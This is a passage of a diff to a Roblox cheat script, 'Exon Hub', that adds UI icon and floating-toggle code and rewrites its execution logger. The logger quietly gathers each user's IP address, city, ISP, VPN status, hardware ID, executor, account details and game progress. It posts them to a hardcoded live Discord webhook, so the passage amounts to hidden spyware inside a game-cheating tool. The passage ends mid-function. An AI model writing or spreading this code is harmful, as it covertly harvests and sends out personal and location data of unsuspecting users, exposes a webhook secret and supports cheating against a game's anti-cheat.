@@ -27,7 +27,7 @@
 		end
 
 		-- remove old UI from previous run
-		for _, name in ipairs({ "Exon", "ExonHubUI" }) do
+		for _, name in ipairs({ "Exon", "ExonHubUI", "ExonHubFloatingToggle", "ExonHubMinimizedClone", "ExonHubMinimizedGui" }) do
 			local old = playerGui:FindFirstChild(name)
 			if old then
 				old:Destroy()
@@ -60,6 +60,17 @@
 		local GOLDEN_EGG_TP_OFFSET = Vector3.new(0, 3, 0)
 		-- Paste your Discord channel webhook URL here (Server Settings → Integrations → Webhooks)
 		local EXONHUB_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1522690164093358110/gP1G5kEHAoOOQaYH5DV9hAvO2jKHzTsBIkAt7x9GctKXPoXeeeWjRWGOCciAWLlF-TXo"
+		local EXONHUB_DISCORD_BOT_NAME = "Exon Hub"
+		local EXONHUB_ICON_ASSET_ID = 131372483038871
+		local EXONHUB_ICON_ASSET = "rbxassetid://" .. tostring(EXONHUB_ICON_ASSET_ID)
+		local EXONHUB_ICON_URL = "https://cdn.discordapp.com/attachments/1522686323234832526/1522695144611123250/bce603ec-f4f6-458d-ad80-226aee524ea5.png"
+		local EXONHUB_DISCORD_ICON_URL = EXONHUB_ICON_URL
+		local EXONHUB_USAGE_DIR = "ExonHub/usage"
+		local EXONHUB_MINIMIZED_PULSE = 0.05
+		local EXONHUB_MINIMIZED_SIZE = UDim2.new(0.0637589768, 0, 0.113416299, 0)
+		local EXONHUB_MINIMIZED_POSITION = UDim2.new(0.467708319 + 0.0637589768 * 0.5, 0, 0.0692661181, 0)
+		local EXONHUB_TOPBAR_ICON_SIZE = 56
+		local EXONHUB_ICON_ROTATION_SPEED = 90
 
 		-- Anti-cheat: only enter roam after 3 real collect failures
 		local AC_MITIGATION_TIME = 30
@@ -170,6 +181,11 @@
 			antiAfkRunning = false,
 			antiAfkIdledConnection = nil,
 			cachedSafeZoneRegions = nil,
+			usageStats = nil,
+			usageLastCheckpoint = nil,
+			usageTrackingActive = false,
+			topbarIconRotationConn = nil,
+			minimizedIconRotationConn = nil,
 		}
 		local UI = {
 			caveAutoOpenToggles = {},
@@ -323,62 +339,921 @@
 			print("[ExonHub]", text)
 		end
 
+		function H.truncateText(text, maxLen)
+			text = tostring(text or "")
+			if #text <= maxLen then
+				return text
+			end
+			return text:sub(1, maxLen - 3) .. "..."
+		end
+
+		function H.startUiRotation(guiObject, speedDegreesPerSecond)
+			if not guiObject then
+				return nil
+			end
+			local speed = speedDegreesPerSecond or EXONHUB_ICON_ROTATION_SPEED
+			return RunService.Heartbeat:Connect(function(dt)
+				if guiObject.Parent then
+					guiObject.Rotation = (guiObject.Rotation + speed * dt) % 360
+				end
+			end)
+		end
+
+		function H.applyExonHubWindowIcon(window)
+			task.spawn(function()
+				pcall(function()
+					local ContentProvider = game:GetService("ContentProvider")
+					ContentProvider:PreloadAsync({ EXONHUB_ICON_ASSET })
+				end)
+
+				pcall(function()
+					if window.SetIconSize then
+						window:SetIconSize(EXONHUB_TOPBAR_ICON_SIZE)
+					end
+				end)
+
+				for _ = 1, 15 do
+					task.wait(0.25)
+					local topbarLeft
+					pcall(function()
+						topbarLeft = window.UIElements.Main.Main.Topbar.Left
+					end)
+					if not topbarLeft then
+						continue
+					end
+
+					local iconHolder = topbarLeft:FindFirstChild("ExonHubIcon")
+					local imageLabel
+
+					if iconHolder then
+						imageLabel = iconHolder:FindFirstChildWhichIsA("ImageLabel", true)
+					else
+						for _, desc in ipairs(topbarLeft:GetDescendants()) do
+							if desc:IsA("ImageLabel") then
+								imageLabel = desc
+								iconHolder = desc.Parent
+								break
+							end
+						end
+					end
+
+					if not iconHolder then
+						iconHolder = Instance.new("Frame")
+						iconHolder.Name = "ExonHubIcon"
+						iconHolder.BackgroundTransparency = 1
+						iconHolder.LayoutOrder = 0
+						iconHolder.Parent = topbarLeft
+					end
+
+					iconHolder.Size = UDim2.fromOffset(EXONHUB_TOPBAR_ICON_SIZE, EXONHUB_TOPBAR_ICON_SIZE)
+					iconHolder.AnchorPoint = Vector2.new(0.5, 0.5)
+
+					if not imageLabel then
+						imageLabel = Instance.new("ImageLabel")
+						imageLabel.BackgroundTransparency = 1
+						imageLabel.Size = UDim2.fromScale(1, 1)
+						imageLabel.ScaleType = Enum.ScaleType.Fit
+						imageLabel.Parent = iconHolder
+					end
+
+					imageLabel.Image = EXONHUB_ICON_ASSET
+					imageLabel.ImageColor3 = Color3.new(1, 1, 1)
+					imageLabel.ImageTransparency = 0
+					imageLabel.Visible = true
+
+					if not S.topbarIconRotationConn then
+						S.topbarIconRotationConn = H.startUiRotation(iconHolder, EXONHUB_ICON_ROTATION_SPEED)
+					end
+
+					return
+				end
+			end)
+		end
+
+		function H.buildExonHubMinimizedUi()
+			local gui = Instance.new("ScreenGui")
+			gui.Name = "ExonHubMinimizedGui"
+			gui.ResetOnSpawn = false
+			gui.IgnoreGuiInset = false
+			gui.DisplayOrder = 1000
+			gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+			local minimized = Instance.new("ImageLabel")
+			minimized.Name = "ExonHubMinimized"
+			minimized.Size = EXONHUB_MINIMIZED_SIZE
+			minimized.Position = EXONHUB_MINIMIZED_POSITION
+			minimized.AnchorPoint = Vector2.new(0.5, 0.5)
+			minimized.BackgroundColor3 = Color3.new(0, 0, 0.22352942824363708)
+			minimized.BackgroundTransparency = 0
+			minimized.BorderSizePixel = 0
+			minimized.Image = EXONHUB_ICON_ASSET
+			minimized.ImageColor3 = Color3.new(1, 1, 1)
+			minimized.ImageTransparency = 0
+			minimized.ScaleType = Enum.ScaleType.Fit
+			minimized.ZIndex = 1000000000
+			minimized.LayoutOrder = 1
+			minimized.Active = false
+			minimized.Interactable = true
+			minimized.Visible = false
+			minimized.Parent = gui
+
+			local corner = Instance.new("UICorner")
+			corner.CornerRadius = UDim.new(1, 0)
+			corner.Parent = minimized
+
+			local aspect = Instance.new("UIAspectRatioConstraint")
+			aspect.AspectRatio = 1.0003353357315064
+			aspect.AspectType = Enum.AspectType.FitWithinMaxSize
+			aspect.DominantAxis = Enum.DominantAxis.Width
+			aspect.Parent = minimized
+
+			local strokeCenter = Instance.new("UIStroke")
+			strokeCenter.Color = Color3.new(0, 0, 0.13333334028720856)
+			strokeCenter.Thickness = 0.019999999552965165
+			strokeCenter.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
+			strokeCenter.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+			strokeCenter.BorderStrokePosition = Enum.BorderStrokePosition.Center
+			strokeCenter.Transparency = 0
+			strokeCenter.LineJoinMode = Enum.LineJoinMode.Round
+			strokeCenter.Parent = minimized
+
+			local strokeInner = Instance.new("UIStroke")
+			strokeInner.Color = Color3.new(1, 1, 1)
+			strokeInner.Thickness = 0.05000000074505806
+			strokeInner.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
+			strokeInner.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+			strokeInner.BorderStrokePosition = Enum.BorderStrokePosition.Inner
+			strokeInner.Transparency = 0.8299999833106995
+			strokeInner.LineJoinMode = Enum.LineJoinMode.Round
+			strokeInner.Parent = minimized
+
+			local strokeOuter = Instance.new("UIStroke")
+			strokeOuter.Color = Color3.new(0, 0, 0)
+			strokeOuter.Thickness = 0.05000000074505806
+			strokeOuter.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
+			strokeOuter.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+			strokeOuter.BorderStrokePosition = Enum.BorderStrokePosition.Outer
+			strokeOuter.Transparency = 0.8299999833106995
+			strokeOuter.LineJoinMode = Enum.LineJoinMode.Round
+			strokeOuter.Parent = minimized
+
+			local uiScale = Instance.new("UIScale")
+			uiScale.Name = "PulseScale"
+			uiScale.Scale = 1
+			uiScale.Parent = minimized
+
+			gui.Parent = playerGui
+			return minimized, gui, {
+				uiScale = uiScale,
+				strokes = { strokeCenter, strokeInner, strokeOuter },
+				strokeRestTransparency = { 0, 0.8299999833106995, 0.8299999833106995 },
+			}
+		end
+
+		function H.createExonHubFloatingToggle(window)
+			local TweenService = game:GetService("TweenService")
+			local UserInputService = game:GetService("UserInputService")
+
+			local minimized, gui, uiMeta = H.buildExonHubMinimizedUi()
+
+			minimized.Visible = false
+			minimized.Active = true
+			minimized.Interactable = true
+
+			local toggleVisible = false
+			local windowDestroyed = false
+			local allowMinimized = true
+			local dragging = false
+			local dragStartPos = nil
+			local dragStartElementPos = nil
+			local savedPosition = minimized.Position
+			local savedSize = minimized.Size
+			local savedAnchorPoint = minimized.AnchorPoint
+			local savedZIndex = minimized.ZIndex
+			local strokes = uiMeta.strokes
+			local strokeRest = uiMeta.strokeRestTransparency
+			local pulseScale = uiMeta.uiScale
+			local pulseConn = nil
+			local fadeInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+			local function stopPulse()
+				if pulseConn then
+					pulseConn:Disconnect()
+					pulseConn = nil
+				end
+				if pulseScale then
+					pulseScale.Scale = 1
+				end
+			end
+
+			local function startPulse()
+				stopPulse()
+				if not pulseScale then
+					return
+				end
+				local baseTime = os.clock()
+				pulseConn = RunService.Heartbeat:Connect(function()
+					if not toggleVisible or not minimized.Parent then
+						stopPulse()
+						return
+					end
+					local elapsed = os.clock() - baseTime
+					pulseScale.Scale = 1 + math.sin(elapsed * 3.2) * EXONHUB_MINIMIZED_PULSE
+				end)
+			end
+
+			if not S.minimizedIconRotationConn then
+				S.minimizedIconRotationConn = H.startUiRotation(minimized, EXONHUB_ICON_ROTATION_SPEED)
+			end
+
+			local function destroyMinimizedUi()
+				allowMinimized = false
+				toggleVisible = false
+				stopPulse()
+				minimized.Visible = false
+				if gui and gui.Parent then
+					gui:Destroy()
+				end
+				UI.floatingToggle = nil
+				UI.floatingToggleGui = nil
+			end
+
+			local function isWindowOpen()
+				local isOpen = false
+				pcall(function()
+					local main = window.UIElements and window.UIElements.Main
+					if main then
+						isOpen = main.Visible == true
+					end
+				end)
+				return isOpen
+			end
+
+			local function tweenFade(show)
+				local imageGoal = show and 0 or 1
+				local bgGoal = show and 0 or 1
+
+				TweenService:Create(minimized, fadeInfo, {
+					ImageTransparency = imageGoal,
+					BackgroundTransparency = bgGoal,
+				}):Play()
+
+				for index, stroke in ipairs(strokes) do
+					local restTransparency = strokeRest[index] or 0
+					local strokeGoal = show and restTransparency or 1
+					TweenService:Create(stroke, fadeInfo, {
+						Transparency = strokeGoal,
+					}):Play()
+				end
+			end
+
+			local function showToggle()
+				if not allowMinimized or windowDestroyed or toggleVisible then
+					return
+				end
+				toggleVisible = true
+				minimized.Position = savedPosition
+				minimized.Size = savedSize
+				minimized.AnchorPoint = savedAnchorPoint
+				minimized.ZIndex = savedZIndex
+				minimized.Visible = true
+				minimized.ImageTransparency = 1
+				minimized.BackgroundTransparency = 1
+				for _, stroke in ipairs(strokes) do
+					stroke.Transparency = 1
+				end
+				tweenFade(true)
+				startPulse()
+			end
+
+			local function hideToggle()
+				if not toggleVisible then
+					return
+				end
+				toggleVisible = false
+				stopPulse()
+				tweenFade(false)
+				task.delay(0.3, function()
+					if not toggleVisible then
+						minimized.Visible = false
+					end
+				end)
+			end
+
+			local function openWindow()
+				pcall(function()
+					if window.Open then
+						window:Open()
+					elseif window.Toggle then
+						window:Toggle()
+					end
+				end)
+			end
+
+			local function onPointerDown(input)
+				if
+					input.UserInputType ~= Enum.UserInputType.MouseButton1
+					and input.UserInputType ~= Enum.UserInputType.Touch
+				then
+					return
+				end
+				dragging = true
+				dragStartPos = input.Position
+				dragStartElementPos = minimized.Position
+			end
+
+			local function onPointerMove(input)
+				if not dragging then
+					return
+				end
+				if
+					input.UserInputType ~= Enum.UserInputType.MouseMovement
+					and input.UserInputType ~= Enum.UserInputType.Touch
+				then
+					return
+				end
+				local delta = input.Position - dragStartPos
+				minimized.Position = UDim2.new(
+					dragStartElementPos.X.Scale,
+					dragStartElementPos.X.Offset + delta.X,
+					dragStartElementPos.Y.Scale,
+					dragStartElementPos.Y.Offset + delta.Y
+				)
+			end
+
+			local function onPointerUp(input)
+				if
+					input.UserInputType ~= Enum.UserInputType.MouseButton1
+					and input.UserInputType ~= Enum.UserInputType.Touch
+				then
+					return
+				end
+				if not dragging then
+					return
+				end
+
+				local moved = dragStartPos and (input.Position - dragStartPos).Magnitude or 999
+				dragging = false
+				savedPosition = minimized.Position
+
+				if moved < 8 then
+					openWindow()
+				end
+			end
+
+			minimized.InputBegan:Connect(onPointerDown)
+			UserInputService.InputChanged:Connect(onPointerMove)
+			minimized.InputEnded:Connect(onPointerUp)
+			UserInputService.InputEnded:Connect(onPointerUp)
+
+			pcall(function()
+				window:OnOpen(function()
+					hideToggle()
+				end)
+				window:OnClose(function()
+					if allowMinimized and not windowDestroyed then
+						showToggle()
+					end
+				end)
+				window:OnDestroy(function()
+					windowDestroyed = true
+					destroyMinimizedUi()
+				end)
+			end)
+
+			pcall(function()
+				if window.EditOpenButton then
+					window:EditOpenButton({ Enabled = false })
+				end
+			end)
+
+			task.spawn(function()
+				local lastOpen = isWindowOpen()
+				while not windowDestroyed and allowMinimized do
+					task.wait(0.12)
+					if windowDestroyed or not allowMinimized then
+						break
+					end
+					local isOpen = isWindowOpen()
+					if isOpen == lastOpen then
+						continue
+					end
+					lastOpen = isOpen
+					if isOpen then
+						hideToggle()
+					else
+						showToggle()
+					end
+				end
+			end)
+
+			UI.floatingToggle = minimized
+			UI.floatingToggleGui = gui
+		end
+
+		function H.httpRequest(url, method, headers, body)
+			local HttpService = game:GetService("HttpService")
+			local requestFunc = (syn and syn.request)
+				or (http and http.request)
+				or request
+				or (fluxus and fluxus.request)
+				or (krnl and krnl.request)
+
+			if type(requestFunc) == "function" then
+				local ok, response = pcall(function()
+					return requestFunc({
+						Url = url,
+						url = url,
+						Method = method or "GET",
+						method = method or "GET",
+						Headers = headers or {},
+						headers = headers or {},
+						Body = body,
+						body = body,
+					})
+				end)
+				if ok and type(response) == "table" then
+					local status = response.StatusCode or response.Status or response.statusCode
+					local responseBody = response.Body or response.body
+					local success = (status and status >= 200 and status < 300) or response.Success == true
+
+					if success then
+						if method == "POST" then
+							return true
+						end
+						if type(responseBody) == "string" and responseBody ~= "" then
+							return responseBody
+						end
+						return true
+					end
+
+					if type(responseBody) == "string" and responseBody ~= "" then
+						return responseBody
+					end
+				end
+			end
+
+			if method == "POST" and body then
+				local ok = pcall(function()
+					HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+				end)
+				if ok then
+					return true
+				end
+			end
+
+			local ok, result = pcall(function()
+				return HttpService:GetAsync(url, true, headers or {})
+			end)
+			if ok then
+				return result
+			end
+			return nil
+		end
+
+		function H.postDiscordWebhook(webhook, payload)
+			local HttpService = game:GetService("HttpService")
+			local ok, json = pcall(function()
+				return HttpService:JSONEncode(payload)
+			end)
+			if not ok or not json then
+				warn("[ExonHub] Discord payload encode failed:", json)
+				return false
+			end
+
+			local result = H.httpRequest(webhook, "POST", { ["Content-Type"] = "application/json" }, json)
+			if result then
+				return true
+			end
+
+			local posted, err = pcall(function()
+				HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
+			end)
+			if not posted then
+				warn("[ExonHub] Discord webhook failed:", err)
+			end
+			return posted
+		end
+
+		function H.getExecutorInfo()
+			local name = "Unknown"
+			if type(identifyexecutor) == "function" then
+				local ok, a, b = pcall(identifyexecutor)
+				if ok then
+					name = tostring(b or a or name)
+				end
+			elseif type(getexecutorname) == "function" then
+				local ok, result = pcall(getexecutorname)
+				if ok and result then
+					name = tostring(result)
+				end
+			end
+
+			local hwid = nil
+			if type(gethwid) == "function" then
+				local ok, result = pcall(gethwid)
+				if ok and result then
+					hwid = tostring(result)
+				end
+			end
+
+			return name, hwid
+		end
+
+		function H.getNetworkPing()
+			local ping = 0
+			pcall(function()
+				local network = game:GetService("Stats").Network
+				ping = math.floor(network.ServerStatsItem["Data Ping"]:GetValue())
+			end)
+			return ping
+		end
+
+		function H.getRobloxHeadshotUrl(userId)
+			return ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
+		end
+
+		function H.getIpInfo()
+			local HttpService = game:GetService("HttpService")
+			local body = H.httpRequest("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,isp,proxy,mobile")
+			if not body then
+				return nil
+			end
+			local ok, data = pcall(function()
+				return HttpService:JSONDecode(body)
+			end)
+			if ok and type(data) == "table" and data.status == "success" then
+				return data
+			end
+			return nil
+		end
+
+		function H.formatDiscordNumber(value)
+			local numberValue = tonumber(value) or 0
+			local absValue = math.abs(numberValue)
+			if absValue >= 1e12 then
+				return string.format("%.2fT", numberValue / 1e12)
+			elseif absValue >= 1e9 then
+				return string.format("%.2fB", numberValue / 1e9)
+			elseif absValue >= 1e6 then
+				return string.format("%.2fM", numberValue / 1e6)
+			elseif absValue >= 1e3 then
+				return string.format("%.2fK", numberValue / 1e3)
+			end
+			return tostring(math.floor(numberValue))
+		end
+
+		function H.collectDiscordGameStats()
+			local stats = H.getClientStats()
+			if not stats then
+				return nil
+			end
+
+			local snapshot = {
+				level = H.getStatValue(stats, "level"),
+				gold = H.getGoldAmount(),
+				tokens = H.getStatValue(stats, "tokens"),
+				quest_points = H.getCurrencyAmount("quest_points"),
+				shells = H.getCurrencyAmount("shells"),
+				size = H.getStatValue(stats, "size"),
+				xp_skill = H.getStatValue(stats, "xp_skill"),
+				speed_skill = H.getStatValue(stats, "speed_skill"),
+				gold_skill = H.getStatValue(stats, "gold_skill"),
+				crit_skill = H.getStatValue(stats, "crit_skill"),
+				dual_skill = H.getStatValue(stats, "dual_skill"),
+			}
+
+			for _, key in ipairs({ "rebirth", "rebirths", "rebirth_count" }) do
+				local value = H.getStatValue(stats, key)
+				if value > 0 then
+					snapshot.rebirths = value
+					break
+				end
+			end
+
+			return snapshot
+		end
+
+		function H.getUsageStatsFile(userId)
+			return EXONHUB_USAGE_DIR .. "/" .. tostring(userId) .. ".json"
+		end
+
+		function H.loadUsageStats(userId)
+			local defaultStats = { executions = 0, totalSeconds = 0 }
+			if not readfile or not isfile then
+				return defaultStats
+			end
+
+			local path = H.getUsageStatsFile(userId)
+			if not isfile(path) then
+				return defaultStats
+			end
+
+			local ok, raw = pcall(readfile, path)
+			if not ok or type(raw) ~= "string" or raw == "" then
+				return defaultStats
+			end
+
+			local HttpService = game:GetService("HttpService")
+			local decodeOk, data = pcall(function()
+				return HttpService:JSONDecode(raw)
+			end)
+			if decodeOk and type(data) == "table" then
+				return {
+					executions = tonumber(data.executions) or 0,
+					totalSeconds = tonumber(data.totalSeconds) or 0,
+				}
+			end
+
+			return defaultStats
+		end
+
+		function H.saveUsageStats(userId, stats)
+			if not writefile or not makefolder or not isfolder then
+				return false
+			end
+
+			pcall(function()
+				if not isfolder("ExonHub") then
+					makefolder("ExonHub")
+				end
+				if not isfolder(EXONHUB_USAGE_DIR) then
+					makefolder(EXONHUB_USAGE_DIR)
+				end
+			end)
+
+			local HttpService = game:GetService("HttpService")
+			local ok, json = pcall(function()
+				return HttpService:JSONEncode({
+					executions = stats.executions,
+					totalSeconds = math.floor(stats.totalSeconds),
+					lastUpdated = os.time(),
+				})
+			end)
+			if not ok or not json then
+				return false
+			end
+
+			local saved = pcall(writefile, H.getUsageStatsFile(userId), json)
+			return saved
+		end
+
+		function H.formatUsageDuration(totalSeconds)
+			local seconds = math.max(0, math.floor(totalSeconds or 0))
+			local days = math.floor(seconds / 86400)
+			seconds = seconds % 86400
+			local hours = math.floor(seconds / 3600)
+			seconds = seconds % 3600
+			local mins = math.floor(seconds / 60)
+			return string.format("%d days : %d hours : %d mins", days, hours, mins)
+		end
+
+		function H.getCurrentUsageSeconds()
+			if not S.usageStats then
+				return 0
+			end
+			local sessionElapsed = 0
+			if S.usageLastCheckpoint then
+				sessionElapsed = os.clock() - S.usageLastCheckpoint
+			end
+			return S.usageStats.totalSeconds + sessionElapsed
+		end
+
+		function H.checkpointUsageTime()
+			if not S.usageStats or not S.usageLastCheckpoint then
+				return
+			end
+			local elapsed = os.clock() - S.usageLastCheckpoint
+			if elapsed <= 0 then
+				return
+			end
+			S.usageStats.totalSeconds = S.usageStats.totalSeconds + elapsed
+			S.usageLastCheckpoint = os.clock()
+			H.saveUsageStats(player.UserId, S.usageStats)
+		end
+
+		function H.initUsageTracking()
+			S.usageStats = H.loadUsageStats(player.UserId)
+			S.usageStats.executions = S.usageStats.executions + 1
+			S.usageLastCheckpoint = os.clock()
+			H.saveUsageStats(player.UserId, S.usageStats)
+
+			if S.usageTrackingActive then
+				return
+			end
+			S.usageTrackingActive = true
+
+			task.spawn(function()
+				while S.usageTrackingActive do
+					task.wait(60)
+					H.checkpointUsageTime()
+				end
+			end)
+		end
+
+		function H.getDiscordUsageInfo()
+			local executions = S.usageStats and S.usageStats.executions or 1
+			local totalSeconds = H.getCurrentUsageSeconds()
+			return string.format(
+				"Executions: **%d**\nTotal Usage: **%s**",
+				executions,
+				H.formatUsageDuration(totalSeconds)
+			)
+		end
+
 		function H.sendDiscordExecuteLog()
 			local webhook = EXONHUB_DISCORD_WEBHOOK
 			if type(webhook) ~= "string" or webhook == "" or not webhook:find("discord%.com/api/webhooks") then
 				return
 			end
 
+			local hasRequest = (syn and syn.request)
+				or (http and http.request)
+				or request
+				or (fluxus and fluxus.request)
+				or (krnl and krnl.request)
+			if type(hasRequest) ~= "function" then
+				warn("[ExonHub] Discord log skipped: executor has no syn.request / request API")
+			end
+
 			task.spawn(function()
-				local HttpService = game:GetService("HttpService")
-				local gameName = "Unknown"
-				pcall(function()
-					gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+				local ok, err = pcall(function()
+					task.wait(2)
+
+					local UserInputService = game:GetService("UserInputService")
+					local MarketplaceService = game:GetService("MarketplaceService")
+					local Players = game:GetService("Players")
+
+					local userId = player.UserId
+					local profileUrl = ("https://www.roblox.com/users/%d/profile"):format(userId)
+					local headshotUrl = H.getRobloxHeadshotUrl(userId)
+					local executorName, hwid = H.getExecutorInfo()
+					local ipInfo = H.getIpInfo()
+					local gameStats = H.collectDiscordGameStats()
+
+					local gameName = "Unknown"
+					local gameCreator = "Unknown"
+					pcall(function()
+						local info = MarketplaceService:GetProductInfo(game.PlaceId)
+						gameName = info.Name or gameName
+						gameCreator = info.Creator and info.Creator.Name or gameCreator
+					end)
+
+					local premium = "Free"
+					pcall(function()
+						if player.MembershipType == Enum.MembershipType.Premium then
+							premium = "Premium"
+						end
+					end)
+
+					local locale = "Unknown"
+					local country = "Unknown"
+					pcall(function()
+						locale = tostring(player.LocaleId)
+					end)
+					pcall(function()
+						country = tostring(player.CountryRegionCode)
+					end)
+
+					local platform = tostring(UserInputService:GetPlatform())
+					local ping = H.getNetworkPing()
+					local playerCount = #Players:GetPlayers()
+
+					local accountInfo = string.format(
+						"Age: **%d days**\nPremium: **%s**\nLocale: `%s`\nRegion: `%s`",
+						player.AccountAge,
+						premium,
+						locale,
+						country
+					)
+
+					local clientInfo = string.format(
+						"Platform: `%s`\nExecutor: `%s`\nPing: **%d ms**",
+						platform,
+						executorName,
+						ping
+					)
+
+					local sessionInfo = string.format(
+						"**%s** by %s\nPlace: `%d` | Universe: `%d`\nPlayers: **%d**\nJob: `%s`",
+						gameName,
+						gameCreator,
+						game.PlaceId,
+						game.GameId,
+						playerCount,
+						H.truncateText(game.JobId, 180)
+					)
+
+					local usageInfo = H.getDiscordUsageInfo()
+
+					local fields = {
+						{ name = "Username", value = "`" .. player.Name .. "`", inline = true },
+						{ name = "Display Name", value = player.DisplayName, inline = true },
+						{ name = "User ID", value = tostring(userId), inline = true },
+						{ name = "Profile", value = "[Open Roblox Profile](" .. profileUrl .. ")", inline = false },
+						{ name = "Account", value = accountInfo, inline = false },
+						{ name = "Client", value = clientInfo, inline = false },
+						{ name = "Session", value = sessionInfo, inline = false },
+						{ name = "Exon Hub Usage", value = usageInfo, inline = false },
+					}
+
+					if hwid then
+						table.insert(fields, {
+							name = "HWID",
+							value = "`" .. H.truncateText(hwid, 950) .. "`",
+							inline = false,
+						})
+					end
+
+					if ipInfo then
+						table.insert(fields, {
+							name = "Network",
+							value = string.format(
+								"IP: `%s`\nLocation: **%s, %s, %s**\nISP: %s\nProxy/VPN: **%s** | Mobile: **%s**",
+								tostring(ipInfo.query),
+								ipInfo.city or "?",
+								ipInfo.regionName or "?",
+								ipInfo.country or "?",
+								H.truncateText(ipInfo.isp or "Unknown", 200),
+								ipInfo.proxy and "Yes" or "No",
+								ipInfo.mobile and "Yes" or "No"
+							),
+							inline = false,
+						})
+					end
+
+					if gameStats then
+						local progress = string.format(
+							"Level **%s** | Gold **%s** | Tokens **%s**\nQuest **%s** | Shells **%s** | Size **%s**",
+							H.formatDiscordNumber(gameStats.level),
+							H.formatDiscordNumber(gameStats.gold),
+							H.formatDiscordNumber(gameStats.tokens),
+							H.formatDiscordNumber(gameStats.quest_points),
+							H.formatDiscordNumber(gameStats.shells),
+							H.formatDiscordNumber(gameStats.size)
+						)
+						if gameStats.rebirths then
+							progress ..= "\nRebirths **" .. H.formatDiscordNumber(gameStats.rebirths) .. "**"
+						end
+						progress ..= string.format(
+							"\nSkills: XP `%s` | Speed `%s` | Gold `%s` | Crit `%s` | Dual `%s`",
+							H.formatDiscordNumber(gameStats.xp_skill),
+							H.formatDiscordNumber(gameStats.speed_skill),
+							H.formatDiscordNumber(gameStats.gold_skill),
+							H.formatDiscordNumber(gameStats.crit_skill),
+							H.formatDiscordNumber(gameStats.dual_skill)
+						)
+						table.insert(fields, { name = "Progress", value = progress, inline = false })
+					end
+
+					local payload = {
+						username = EXONHUB_DISCORD_BOT_NAME,
+						avatar_url = EXONHUB_DISCORD_ICON_URL,
+						embeds = {
+							{
+								author = {
+									name = EXONHUB_DISCORD_BOT_NAME,
+									icon_url = EXONHUB_DISCORD_ICON_URL,
+								},
+								title = "New Script Execution",
+								description = string.format(
+									"**[%s](%s)** (`%s`) loaded **Exon Hub**.",
+									player.DisplayName,
+									profileUrl,
+									player.Name
+								),
+								color = 5793266,
+								thumbnail = { url = headshotUrl },
+								fields = fields,
+								footer = {
+									text = EXONHUB_DISCORD_BOT_NAME .. " • User ID " .. tostring(userId),
+									icon_url = EXONHUB_DISCORD_ICON_URL,
+								},
+								timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+							},
+						},
+					}
+
+					if H.postDiscordWebhook(webhook, payload) then
+						print("[ExonHub] Discord log sent")
+					else
+						local fallback = {
+							username = EXONHUB_DISCORD_BOT_NAME,
+							content = string.format(
+								"**%s** (`%s`) | ID `%d` | %s\n%s",
+								player.DisplayName,
+								player.Name,
+								userId,
+								gameName,
+								usageInfo:gsub("%*%*", "")
+							),
+						}
+						H.postDiscordWebhook(webhook, fallback)
+					end
 				end)
 
-				local payload = {
-					embeds = {
-						{
-							title = "ExonHub Executed",
-							color = 5763719,
-							fields = {
-								{ name = "Username", value = player.Name, inline = true },
-								{ name = "Display", value = player.DisplayName, inline = true },
-								{ name = "User ID", value = tostring(player.UserId), inline = true },
-								{
-									name = "Game",
-									value = gameName .. " (`" .. tostring(game.PlaceId) .. "`)",
-									inline = false,
-								},
-							},
-							footer = { text = "ExonHub" },
-						},
-					},
-				}
-
-				local json = HttpService:JSONEncode(payload)
-				local posted = false
-				local requestFunc = (syn and syn.request)
-					or (http and http.request)
-					or request
-					or (fluxus and fluxus.request)
-					or (krnl and krnl.request)
-
-				if type(requestFunc) == "function" then
-					posted = pcall(function()
-						requestFunc({
-							Url = webhook,
-							Method = "POST",
-							Headers = { ["Content-Type"] = "application/json" },
-							Body = json,
-						})
-					end)
-				end
-
-				if not posted then
-					pcall(function()
-						HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
-					end)
+				if not ok then
+					warn("[ExonHub] Discord log error:", err)
 				end
 			end)
 		end
@@ -1926,49 +2801,69 @@
 
 		function H.getGoldenEggInstances()
 			local eggs = {}
+			local seen = {}
 
 			local function addEgg(instance)
-				if not instance then
+				if not instance or seen[instance] then
 					return
 				end
-				if instance:IsA("BasePart") or instance:IsA("Model") then
-					table.insert(eggs, instance)
+				if not (instance:IsA("BasePart") or instance:IsA("Model")) then
+					return
+				end
+				if not instance:IsDescendantOf(workspace) then
+					return
+				end
+				seen[instance] = true
+				table.insert(eggs, instance)
+			end
+
+			for _, desc in ipairs(workspace:GetDescendants()) do
+				if desc.Name == GOLDEN_EGG_NAME and (desc:IsA("BasePart") or desc:IsA("Model")) then
+					if desc:IsA("Model") then
+						addEgg(desc)
+					elseif desc:IsA("BasePart") then
+						local parentModel = desc:FindFirstAncestorOfClass("Model")
+						if parentModel and parentModel.Name == GOLDEN_EGG_NAME then
+							addEgg(parentModel)
+						else
+							addEgg(desc)
+						end
+					end
 				end
 			end
 
-			for _, child in ipairs(workspace:GetChildren()) do
-				if child.Name == GOLDEN_EGG_NAME then
-					addEgg(child)
+			local function getEggPosition(egg)
+				if egg:IsA("BasePart") then
+					return egg.Position
 				end
-			end
-
-			local eggRoot = workspace:FindFirstChild(GOLDEN_EGG_NAME)
-			if eggRoot and (eggRoot:IsA("Folder") or eggRoot:IsA("Model")) then
-				for _, child in ipairs(eggRoot:GetChildren()) do
-					addEgg(child)
+				if egg:IsA("Model") then
+					local ok, pivot = pcall(function()
+						return egg:GetPivot().Position
+					end)
+					if ok then
+						return pivot
+					end
+					local primary = egg.PrimaryPart or egg:FindFirstChildWhichIsA("BasePart", true)
+					if primary then
+						return primary.Position
+					end
 				end
+				return Vector3.zero
 			end
 
 			table.sort(eggs, function(a, b)
-				return a:GetFullName() < b:GetFullName()
+				local aPos = getEggPosition(a)
